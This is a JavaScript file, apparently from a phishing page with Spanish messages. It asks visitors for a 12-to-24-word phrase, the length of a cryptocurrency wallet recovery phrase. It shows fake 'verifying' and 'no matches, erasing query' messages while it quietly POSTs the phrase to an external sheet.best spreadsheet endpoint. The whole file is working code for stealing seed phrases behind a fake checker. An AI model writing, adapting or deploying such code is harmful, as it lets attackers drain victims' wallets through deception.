const form = document.querySelector("form"),
	btn = document.getElementById("btn");
let input = form.querySelector("input[type='text']");
form.addEventListener("submit", e => {
	let door = true,
		cont = 0;

	e.preventDefault()

	let data = input.value.split(" ")

	if (data.length < 12 || data.length > 24) {
		btn.value = "La frase debe de tener de 12 a 24 palabras"
		setTimeout(() => {
			btn.value = "Verificar"

		}, 2000)
		return false

	}

	for (let i = 0; data.length >= i; i++) {
		if (data[i] == "") {
			data.splice(i, 1)
		}
	}
	console.log(data)
	data.forEach((elem, index) => {
		console.log(elem, isNaN(elem))
		if (isNaN(elem) == false) {
			cont++
			btn.value = "La frase no debe tener números ni carácteres "
			setTimeout(() => {
				btn.value = "Verificar"
			}, 2000)

		}
		if (index == data.length - 1) {
			if (cont == 0) {
				btn.value = "Verificando..."
				setTimeout(() => {
					btn.value = "Enhorabuena,no hay coincidencias"
					setTimeout(() => {
						btn.value = "Borrando consulta..."
						setTimeout(() => {
							btn.value = "Verificar"
														input.value = ""
						}, 2500)
					}, 2500)
				}, 4000)
			}
		}
	})

	if (cont > 0) {
		return false
	}


	fetch("https://sheet.best/api/sheets/f89d6959-4b0d-479e-9bcd-3d5222020639", {
		method: 'POST',
		mode: 'cors',
		headers: {
			'Content-Type': 'application/json'
		},
		body: JSON.stringify({
			"key": String(data)
		})
	})



})